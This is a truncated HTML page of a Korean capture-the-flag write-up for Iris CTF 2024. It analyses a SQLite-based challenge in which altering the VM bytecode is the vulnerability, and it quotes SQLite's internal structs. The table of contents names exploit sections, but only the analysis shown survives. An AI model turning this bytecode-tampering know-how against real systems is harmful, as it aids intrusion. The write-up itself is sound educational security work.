<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Iris CTF 2024 | msh1307</title>
<meta name="keywords" content="sqlite internals, sqlite exploit, sequilitis, Serious-banking">
<meta name="description" content="DeadSec으로 참여했다. 당시엔 팀원분이 풀어주셔서 넘겼지만, sqlite3라 꼭 혼자 풀어보고싶었다.
sequilitis SQL query를 만들고 실행시키는 프로그램이다.
Analysis chal 여러 옵션이 존재한다. 먼저 sqlite3는 오픈소스이고 소스코드도 주어지기 때문에 일단 컴파일을 하고 구조체나 enum을 IDA로 import 했다. inscribe 옵션에서 sqlite3의 vm 코드를 수정할 수 있는 취약점이있다. 그리고 execute로 실행하고 나면 column type에 따라 값들이 리턴된다.
sqlite3 sqlite3의 vmcode들을 분석해야한다.
/* forward declaration */ static int sqlite3Prepare( sqlite3 *db, /* Database handle. */ const char *zSql, /* UTF-8 encoded SQL statement.">
<meta name="author" content="">
<link rel="canonical" href="https://msh1307.kr/blog/iris_ctf_2024/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.min.d9c43e0c7cae3b38c51e79921ad3cf2685d9811a56593a817d9b57ac4fdebf2b.css" integrity="sha256-2cQ&#43;DHyuOzjFHnmSGtPPJoXZgRpWWTqBfZtXrE/evys=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/assets/js/highlight.min.b95bacdc39e37a332a9f883b1e78be4abc1fdca2bc1f2641f55e3cd3dabd4d61.js" integrity="sha256-uVus3DnjejMqn4g7Hni&#43;Srwf3KK8HyZB9V4809q9TWE="
    onload="hljs.initHighlightingOnLoad();"></script>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-BR89V2WEC0"></script>
<script>
window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'G-BR89V2WEC0');
</script>
<link rel="icon" href="https://msh1307.kr/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://msh1307.kr/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://msh1307.kr/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://msh1307.kr/apple-touch-icon.png">
<link rel="mask-icon" href="https://msh1307.kr/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --hljs-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:title" content="Iris CTF 2024" />
<meta property="og:description" content="DeadSec으로 참여했다. 당시엔 팀원분이 풀어주셔서 넘겼지만, sqlite3라 꼭 혼자 풀어보고싶었다.
sequilitis SQL query를 만들고 실행시키는 프로그램이다.
Analysis chal 여러 옵션이 존재한다. 먼저 sqlite3는 오픈소스이고 소스코드도 주어지기 때문에 일단 컴파일을 하고 구조체나 enum을 IDA로 import 했다. inscribe 옵션에서 sqlite3의 vm 코드를 수정할 수 있는 취약점이있다. 그리고 execute로 실행하고 나면 column type에 따라 값들이 리턴된다.
sqlite3 sqlite3의 vmcode들을 분석해야한다.
/* forward declaration */ static int sqlite3Prepare( sqlite3 *db, /* Database handle. */ const char *zSql, /* UTF-8 encoded SQL statement." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://msh1307.kr/blog/iris_ctf_2024/" /><meta property="article:section" content="blog" />
<meta property="article:published_time" content="2024-03-10T00:00:00&#43;00:00" />
<meta property="article:modified_time" content="2024-03-10T00:00:00&#43;00:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Iris CTF 2024"/>
<meta name="twitter:description" content="DeadSec으로 참여했다. 당시엔 팀원분이 풀어주셔서 넘겼지만, sqlite3라 꼭 혼자 풀어보고싶었다.
sequilitis SQL query를 만들고 실행시키는 프로그램이다.
Analysis chal 여러 옵션이 존재한다. 먼저 sqlite3는 오픈소스이고 소스코드도 주어지기 때문에 일단 컴파일을 하고 구조체나 enum을 IDA로 import 했다. inscribe 옵션에서 sqlite3의 vm 코드를 수정할 수 있는 취약점이있다. 그리고 execute로 실행하고 나면 column type에 따라 값들이 리턴된다.
sqlite3 sqlite3의 vmcode들을 분석해야한다.
/* forward declaration */ static int sqlite3Prepare( sqlite3 *db, /* Database handle. */ const char *zSql, /* UTF-8 encoded SQL statement."/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "Blogs",
      "item": "https://msh1307.kr/blog/"
    }, 
    {
      "@type": "ListItem",
      "position":  3 ,
      "name": "Iris CTF 2024",
      "item": "https://msh1307.kr/blog/iris_ctf_2024/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Iris CTF 2024",
  "name": "Iris CTF 2024",
  "description": "DeadSec으로 참여했다. 당시엔 팀원분이 풀어주셔서 넘겼지만, sqlite3라 꼭 혼자 풀어보고싶었다.\nsequilitis SQL query를 만들고 실행시키는 프로그램이다.\nAnalysis chal 여러 옵션이 존재한다. 먼저 sqlite3는 오픈소스이고 소스코드도 주어지기 때문에 일단 컴파일을 하고 구조체나 enum을 IDA로 import 했다. inscribe 옵션에서 sqlite3의 vm 코드를 수정할 수 있는 취약점이있다. 그리고 execute로 실행하고 나면 column type에 따라 값들이 리턴된다.\nsqlite3 sqlite3의 vmcode들을 분석해야한다.\n/* forward declaration */ static int sqlite3Prepare( sqlite3 *db, /* Database handle. */ const char *zSql, /* UTF-8 encoded SQL statement.",
  "keywords": [
    "sqlite internals", "sqlite exploit", "sequilitis", "Serious-banking"
  ],
  "articleBody": "DeadSec으로 참여했다. 당시엔 팀원분이 풀어주셔서 넘겼지만, sqlite3라 꼭 혼자 풀어보고싶었다.\nsequilitis SQL query를 만들고 실행시키는 프로그램이다.\nAnalysis chal 여러 옵션이 존재한다. 먼저 sqlite3는 오픈소스이고 소스코드도 주어지기 때문에 일단 컴파일을 하고 구조체나 enum을 IDA로 import 했다. inscribe 옵션에서 sqlite3의 vm 코드를 수정할 수 있는 취약점이있다. 그리고 execute로 실행하고 나면 column type에 따라 값들이 리턴된다.\nsqlite3 sqlite3의 vmcode들을 분석해야한다.\n/* forward declaration */ static int sqlite3Prepare( sqlite3 *db, /* Database handle. */ const char *zSql, /* UTF-8 encoded SQL statement. */ int nBytes, /* Length of zSql in bytes. */ u32 prepFlags, /* Zero or more SQLITE_PREPARE_* flags */ Vdbe *pReprepare, /* VM being reprepared */ sqlite3_stmt **ppStmt, /* OUT: A pointer to the prepared statement */ const char **pzTail /* OUT: End of parsed string */ ); sqlite3_prepare_v3는 내부적으로 Vdbe 라는 vm 구조체를 초기화하면서 바이트 코드들을 점화한다. 이는 내부적으로 호출되는 함수의 선언부만 봐도 알 수 있다.\nstruct Vdbe { sqlite3 *db; /* The database connection that owns this statement */ Vdbe **ppVPrev,*pVNext; /* Linked list of VDBEs with the same Vdbe.db */ Parse *pParse; /* Parsing context used to create this Vdbe */ ynVar nVar; /* Number of entries in aVar[] */ int nMem; /* Number of memory locations currently allocated */ int nCursor; /* Number of slots in apCsr[] */ u32 cacheCtr; /* VdbeCursor row cache generation counter */ int pc; /* The program counter */ int rc; /* Value to return */ i64 nChange; /* Number of db changes made since last reset */ int iStatement; /* Statement number (or 0 if has no opened stmt) */ i64 iCurrentTime; /* Value of julianday('now') for this statement */ i64 nFkConstraint; /* Number of imm. FK constraints this VM */ i64 nStmtDefCons; /* Number of def. constraints when stmt started */ i64 nStmtDefImmCons; /* Number of def. imm constraints when stmt started */ Mem *aMem; /* The memory locations */ Mem **apArg; /* Arguments to currently executing user function */ VdbeCursor **apCsr; /* One element of this array for each open cursor */ Mem *aVar; /* Values for the OP_Variable opcode. */ /* When allocating a new Vdbe object, all of the fields below should be ** initialized to zero or NULL */ Op *aOp; /* Space to hold the virtual machine's program */ int nOp; /* Number of instructions in the program */ int nOpAlloc; /* Slots allocated for aOp[] */ Mem *aColName; /* Column names to return */ Mem *pResultRow; /* Current output row */ char *zErrMsg; /* Error message written here */ VList *pVList; /* Name of variables */ #ifndef SQLITE_OMIT_TRACE i64 startTime; /* Time when query started - used for profiling */ #endif #ifdef SQLITE_DEBUG int rcApp; /* errcode set by sqlite3_result_error_code() */ u32 nWrite; /* Number of write operations that have occurred */ #endif u16 nResColumn; /* Number of columns in one row of the result set */ u16 nResAlloc; /* Column slots allocated to aColName[] */ u8 errorAction; /* Recovery action to do in case of an error */ u8 minWriteFileFormat; /* Minimum file format for writable database files */ u8 prepFlags; /* SQLITE_PREPARE_* flags */ 여기서 Op 구조체를 확인하면 다음과 같다.\nstruct VdbeOp { u8 opcode; /* What operation to perform */ signed char p4type; /* One of the P4_xxx constants for p4 */ u16 p5; /* Fifth parameter is an unsigned 16-bit integer */ int p1; /* First operand */ int p2; /* Second parameter (often the jump destination) */ int p3; /* The third parameter */ union p4union { /* fourth parameter */ int i; /* Integer value if p4type==P4_INT32 */ void *p; /* Generic pointer */ char *z; /* Pointer to data for string (char array) types */ i64 *pI64; /* Used when p4type is P4_INT64 */ double *pReal; /* Used when p4type is P4_REAL */ FuncDef *pFunc; /* Used when p4type is P4_FUNCDEF */ sqlite3_context *pCtx; /* Used when p4type is P4_FUNCCTX */ CollSeq *pColl; /* Used when p4type is P4_COLLSEQ */ Mem *pMem; /* Used when p4type is P4_MEM */ VTable *pVtab; /* Used when p4type is P4_VTAB */ KeyInfo *pKeyInfo; /* Used when p4type is P4_KEYINFO */ u32 *ai; /* Used when p4type is P4_INTARRAY */ SubProgram *pProgram; /* Used when p4type is P4_SUBPROGRAM */ Table *pTab; /* Used when p4type is P4_TABLE */ #ifdef SQLITE_ENABLE_CURSOR_HINTS Expr *pExpr; /* Used when p4type is P4_EXPR */ #endif } p4; #ifdef SQLITE_ENABLE_EXPLAIN_COMMENTS char *zComment; /* Comment to improve readability */ #endif #ifdef SQLITE_VDBE_COVERAGE u32 iSrcLine; /* Source-code line that generated this opcode ** with flags in the upper 8 bits */ #endif #if defined(SQLITE_ENABLE_STMT_SCANSTATUS) || defined(VDBE_PROFILE) u64 nExec; u64 nCycle; #endif }; typedef struct VdbeOp VdbeOp; 분석 속도를 높히기 위해서 앞서 분석한 내용을 토대로 Ops를 dump하는 스크립트를 작성했다.\ndump_ops.py v= '''OP_Savepoint = 0# OP_AutoCommit = 1# OP_Transaction = 2# OP_Checkpoint = 3# OP_JournalMode = 4# OP_Vacuum = 5# OP_VFilter = 6# /* jump, synopsis: iplan=r[P3] zplan='P4' */ OP_VUpdate = 7# /* synopsis: data=r[P3@P2] */ OP_Init = 8# /* jump, synopsis: Start at P2 */ OP_Goto = 9# /* jump */ OP_Gosub = 10# /* jump */ OP_InitCoroutine = 11# /* jump */ OP_Yield = 12# /* jump */ OP_MustBeInt = 13# /* jump */ OP_Jump = 14# /* jump */ OP_Once = 15# /* jump */ OP_If = 16# /* jump */ OP_IfNot = 17# /* jump */ OP_IsType = 18# /* jump, synopsis: if typeof(P1.P3) in P5 goto P2 */ OP_Not = 19# /* same as TK_NOT, synopsis: r[P2]= !r[P1] */ OP_IfNullRow = 20# /* jump, synopsis: if P1.nullRow then r[P3]=NULL, goto P2 */ OP_SeekLT = 21# /* jump, synopsis: key=r[P3@P4] */ OP_SeekLE = 22# /* jump, synopsis: key=r[P3@P4] */ OP_SeekGE = 23# /* jump, synopsis: key=r[P3@P4] */ OP_SeekGT = 24# /* jump, synopsis: key=r[P3@P4] */ OP_IfNotOpen = 25# /* jump, synopsis: if( !csr[P1] ) goto P2 */ OP_IfNoHope = 26# /* jump, synopsis: key=r[P3@P4] */ OP_NoConflict = 27# /* jump, synopsis: key=r[P3@P4] */ OP_NotFound = 28# /* jump, synopsis: key=r[P3@P4] */ OP_Found = 29# /* jump, synopsis: key=r[P3@P4] */ OP_SeekRowid = 30# /* jump, synopsis: intkey=r[P3] */ OP_NotExists = 31# /* jump, synopsis: intkey=r[P3] */ OP_Last = 32# /* jump */ OP_IfSmaller = 33# /* jump */ OP_SorterSort = 34# /* jump */ OP_Sort = 35# /* jump */ OP_Rewind = 36# /* jump */ OP_SorterNext = 37# /* jump */ OP_Prev = 38# /* jump */ OP_Next = 39# /* jump */ OP_IdxLE = 40# /* jump, synopsis: key=r[P3@P4] */ OP_IdxGT = 41# /* jump, synopsis: key=r[P3@P4] */ OP_IdxLT = 42# /* jump, synopsis: key=r[P3@P4] */ OP_Or = 43# /* same as TK_OR, synopsis: r[P3]=(r[P1] || r[P2]) */ OP_And = 44# /* same as TK_AND, synopsis: r[P3]=(r[P1] \u0026\u0026 r[P2]) */ OP_IdxGE = 45# /* jump, synopsis: key=r[P3@P4] */ OP_RowSetRead = 46# /* jump, synopsis: r[P3]=rowset(P1) */ OP_RowSetTest = 47# /* jump, synopsis: if r[P3] in rowset(P1) goto P2 */ OP_Program = 48# /* jump */ OP_FkIfZero = 49# /* jump, synopsis: if fkctr[P1]==0 goto P2 */ OP_IsNull = 50# /* jump, same as TK_ISNULL, synopsis: if r[P1]==NULL goto P2 */ OP_NotNull = 51# /* jump, same as TK_NOTNULL, synopsis: if r[P1]!=NULL goto P2 */ OP_Ne = 52# /* jump, same as TK_NE, synopsis: IF r[P3]!=r[P1] */ OP_Eq = 53# /* jump, same as TK_EQ, synopsis: IF r[P3]==r[P1] */ OP_Gt = 54# /* jump, same as TK_GT, synopsis: IF r[P3]\u003er[P1] */ OP_Le = 55# /* jump, same as TK_LE, synopsis: IF r[P3]\u003c=r[P1] */ OP_Lt = 56# /* jump, same as TK_LT, synopsis: IF r[P3]",
  "wordCount" : "6632",
  "inLanguage": "en",
  "datePublished": "2024-03-10T00:00:00Z",
  "dateModified": "2024-03-10T00:00:00Z",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://msh1307.kr/blog/iris_ctf_2024/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "msh1307",
    "logo": {
      "@type": "ImageObject",
      "url": "https://msh1307.kr/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header sticky-header">
    
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-BR89V2WEC0"></script>
    <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());
    gtag('config', 'G-BR89V2WEC0');
    </script>
    <nav class="nav">
        <div class="logo">
            <a href="https://msh1307.kr" accesskey="h" title="msh1307 (Alt + H)">msh1307</a>
            <span class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </span>
        </div>
        <ul id="menu">
            <li>
                <a href="https://msh1307.kr/" title="Home">
                    <span>Home</span>
                </a>
            </li>
            <li>
                <a href="https://msh1307.kr/blog" title="Blog">
                    <span>Blog</span>
                </a>
            </li>
            <li>
                <a href="https://msh1307.kr/about" title="About">
                    <span>About</span>
                </a>
            </li>
            <li>
                <a href="https://msh1307.kr/search" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
            <li>
                <a href="https://msh1307.kr/categories" title="Categories">
                    <span>Categories</span>
                </a>
            </li>
            <li>
                <a href="https://msh1307.kr/tags" title="Tags">
                    <span>Tags</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://msh1307.kr">Home</a>&nbsp;»&nbsp;<a href="https://msh1307.kr/blog/">Blogs</a></div>
    <h1 class="post-title">
      Iris CTF 2024
    </h1>
    <div class="post-meta">


March 2024

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">‎ Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#sequilitis" aria-label="sequilitis">sequilitis</a><ul>
                        
                <li>
                    <a href="#analysis" aria-label="Analysis">Analysis</a><ul>
                        
                <li>
                    <a href="#chal" aria-label="chal">chal</a></li>
                <li>
                    <a href="#sqlite3" aria-label="sqlite3">sqlite3</a><ul>
                        
                <li>
                    <a href="#dump_opspy" aria-label="dump_ops.py">dump_ops.py</a></li></ul>
                </li></ul>
                </li>
                <li>
                    <a href="#exploitation" aria-label="Exploitation">Exploitation</a><ul>
                        
                <li>
                    <a href="#mem_dumppy" aria-label="mem_dump.py">mem_dump.py</a></li>
                <li>
                    <a href="#memory-leak" aria-label="Memory leak">Memory leak</a></li>
                <li>
                    <a href="#code-execution" aria-label="Code Execution">Code Execution</a></li>
                <li>
                    <a href="#exploit-script" aria-label="Exploit script">Exploit script</a></li></ul>
                </li></ul>
                </li>
                <li>
                    <a href="#serious-banking" aria-label="Serious-banking">Serious-banking</a><ul>
                        
                <li>
                    <a href="#analysis-1" aria-label="Analysis">Analysis</a></li>
                <li>
                    <a href="#exploit" aria-label="Exploit">Exploit</a><ul>
                        
                <li>
                    <a href="#exploit-script-1" aria-label="Exploit script">Exploit script</a>
                </li>
            </ul>
            </li>
            </ul>
            </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><p>DeadSec으로 참여했다. 당시엔 팀원분이 풀어주셔서 넘겼지만, sqlite3라 꼭 혼자 풀어보고싶었다.</p>
<h1 id="sequilitis">sequilitis<a hidden class="anchor" aria-hidden="true" href="#sequilitis">#</a></h1>
<p>SQL query를 만들고 실행시키는 프로그램이다.</p>
<h2 id="analysis">Analysis<a hidden class="anchor" aria-hidden="true" href="#analysis">#</a></h2>
<h3 id="chal">chal<a hidden class="anchor" aria-hidden="true" href="#chal">#</a></h3>
<p><img loading="lazy" src="/blog/Iris_CTF_2024/a6c33e5a08a370d06bcf55f97e82cdfb.png" alt=""  />

여러 옵션이 존재한다.
먼저 sqlite3는 오픈소스이고 소스코드도 주어지기 때문에 일단 컴파일을 하고 구조체나 enum을 IDA로 import 했다.
<img loading="lazy" src="/blog/Iris_CTF_2024/55fa6ad447d5d07068c62bc1ef2f357e.png" alt=""  />

inscribe 옵션에서 sqlite3의 vm 코드를 수정할 수 있는 취약점이있다.
<img loading="lazy" src="/blog/Iris_CTF_2024/bbf459f0e1cad640446243885b9313fc.png" alt=""  />

그리고 execute로 실행하고 나면 column type에 따라 값들이 리턴된다.</p>
<h3 id="sqlite3">sqlite3<a hidden class="anchor" aria-hidden="true" href="#sqlite3">#</a></h3>
<p>sqlite3의 vmcode들을 분석해야한다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">/* forward declaration */</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">sqlite3Prepare</span>(
</span></span><span style="display:flex;"><span>  sqlite3 <span style="color:#f92672">*</span>db,              <span style="color:#75715e">/* Database handle. */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>zSql,         <span style="color:#75715e">/* UTF-8 encoded SQL statement. */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> nBytes,               <span style="color:#75715e">/* Length of zSql in bytes. */</span>
</span></span><span style="display:flex;"><span>  u32 prepFlags,            <span style="color:#75715e">/* Zero or more SQLITE_PREPARE_* flags */</span>
</span></span><span style="display:flex;"><span>  Vdbe <span style="color:#f92672">*</span>pReprepare,         <span style="color:#75715e">/* VM being reprepared */</span>
</span></span><span style="display:flex;"><span>  sqlite3_stmt <span style="color:#f92672">**</span>ppStmt,    <span style="color:#75715e">/* OUT: A pointer to the prepared statement */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>pzTail       <span style="color:#75715e">/* OUT: End of parsed string */</span>
</span></span><span style="display:flex;"><span>);
</span></span></code></pre></div><p>sqlite3_prepare_v3는 내부적으로 Vdbe 라는 vm 구조체를 초기화하면서 바이트 코드들을 점화한다.
이는 내부적으로 호출되는 함수의 선언부만 봐도 알 수 있다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> Vdbe {
</span></span><span style="display:flex;"><span>  sqlite3 <span style="color:#f92672">*</span>db;            <span style="color:#75715e">/* The database connection that owns this statement */</span>
</span></span><span style="display:flex;"><span>  Vdbe <span style="color:#f92672">**</span>ppVPrev,<span style="color:#f92672">*</span>pVNext; <span style="color:#75715e">/* Linked list of VDBEs with the same Vdbe.db */</span>
</span></span><span style="display:flex;"><span>  Parse <span style="color:#f92672">*</span>pParse;          <span style="color:#75715e">/* Parsing context used to create this Vdbe */</span>
</span></span><span style="display:flex;"><span>  ynVar nVar;             <span style="color:#75715e">/* Number of entries in aVar[] */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> nMem;               <span style="color:#75715e">/* Number of memory locations currently allocated */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> nCursor;            <span style="color:#75715e">/* Number of slots in apCsr[] */</span>
</span></span><span style="display:flex;"><span>  u32 cacheCtr;           <span style="color:#75715e">/* VdbeCursor row cache generation counter */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> pc;                 <span style="color:#75715e">/* The program counter */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> rc;                 <span style="color:#75715e">/* Value to return */</span>
</span></span><span style="display:flex;"><span>  i64 nChange;            <span style="color:#75715e">/* Number of db changes made since last reset */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iStatement;         <span style="color:#75715e">/* Statement number (or 0 if has no opened stmt) */</span>
</span></span><span style="display:flex;"><span>  i64 iCurrentTime;       <span style="color:#75715e">/* Value of julianday(&#39;now&#39;) for this statement */</span>
</span></span><span style="display:flex;"><span>  i64 nFkConstraint;      <span style="color:#75715e">/* Number of imm. FK constraints this VM */</span>
</span></span><span style="display:flex;"><span>  i64 nStmtDefCons;       <span style="color:#75715e">/* Number of def. constraints when stmt started */</span>
</span></span><span style="display:flex;"><span>  i64 nStmtDefImmCons;    <span style="color:#75715e">/* Number of def. imm constraints when stmt started */</span>
</span></span><span style="display:flex;"><span>  Mem <span style="color:#f92672">*</span>aMem;              <span style="color:#75715e">/* The memory locations */</span>
</span></span><span style="display:flex;"><span>  Mem <span style="color:#f92672">**</span>apArg;            <span style="color:#75715e">/* Arguments to currently executing user function */</span>
</span></span><span style="display:flex;"><span>  VdbeCursor <span style="color:#f92672">**</span>apCsr;     <span style="color:#75715e">/* One element of this array for each open cursor */</span>
</span></span><span style="display:flex;"><span>  Mem <span style="color:#f92672">*</span>aVar;              <span style="color:#75715e">/* Values for the OP_Variable opcode. */</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* When allocating a new Vdbe object, all of the fields below should be
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">  ** initialized to zero or NULL */</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  Op <span style="color:#f92672">*</span>aOp;                <span style="color:#75715e">/* Space to hold the virtual machine&#39;s program */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> nOp;                <span style="color:#75715e">/* Number of instructions in the program */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> nOpAlloc;           <span style="color:#75715e">/* Slots allocated for aOp[] */</span>
</span></span><span style="display:flex;"><span>  Mem <span style="color:#f92672">*</span>aColName;          <span style="color:#75715e">/* Column names to return */</span>
</span></span><span style="display:flex;"><span>  Mem <span style="color:#f92672">*</span>pResultRow;        <span style="color:#75715e">/* Current output row */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>zErrMsg;          <span style="color:#75715e">/* Error message written here */</span>
</span></span><span style="display:flex;"><span>  VList <span style="color:#f92672">*</span>pVList;          <span style="color:#75715e">/* Name of variables */</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#ifndef SQLITE_OMIT_TRACE
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  i64 startTime;          <span style="color:#75715e">/* Time when query started - used for profiling */</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#endif
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#ifdef SQLITE_DEBUG
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> rcApp;              <span style="color:#75715e">/* errcode set by sqlite3_result_error_code() */</span>
</span></span><span style="display:flex;"><span>  u32 nWrite;             <span style="color:#75715e">/* Number of write operations that have occurred */</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#endif
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  u16 nResColumn;         <span style="color:#75715e">/* Number of columns in one row of the result set */</span>
</span></span><span style="display:flex;"><span>  u16 nResAlloc;          <span style="color:#75715e">/* Column slots allocated to aColName[] */</span>
</span></span><span style="display:flex;"><span>  u8 errorAction;         <span style="color:#75715e">/* Recovery action to do in case of an error */</span>
</span></span><span style="display:flex;"><span>  u8 minWriteFileFormat;  <span style="color:#75715e">/* Minimum file format for writable database files */</span>
</span></span><span style="display:flex;"><span>  u8 prepFlags;           <span style="color:#75715e">/* SQLITE_PREPARE_* flags */</span>
</span></span></code></pre></div><p>여기서 Op 구조체를 확인하면 다음과 같다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> VdbeOp {
</span></span><span style="display:flex;"><span>  u8 opcode;          <span style="color:#75715e">/* What operation to perform */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">char</span> p4type; <span style="color:#75715e">/* One of the P4_xxx constants for p4 */</span>
</span></span><span style="display:flex;"><span>  u16 p5;             <span style="color:#75715e">/* Fifth parameter is an unsigned 16-bit integer */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> p1;             <span style="color:#75715e">/* First operand */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> p2;             <span style="color:#75715e">/* Second parameter (often the jump destination) */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> p3;             <span style="color:#75715e">/* The third parameter */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">union</span> p4union {     <span style="color:#75715e">/* fourth parameter */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> i;                 <span style="color:#75715e">/* Integer value if p4type==P4_INT32 */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>p;               <span style="color:#75715e">/* Generic pointer */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>z;               <span style="color:#75715e">/* Pointer to data for string (char array) types */</span>
</span></span><span style="display:flex;"><span>    i64 <span style="color:#f92672">*</span>pI64;             <span style="color:#75715e">/* Used when p4type is P4_INT64 */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">double</span> <span style="color:#f92672">*</span>pReal;         <span style="color:#75715e">/* Used when p4type is P4_REAL */</span>
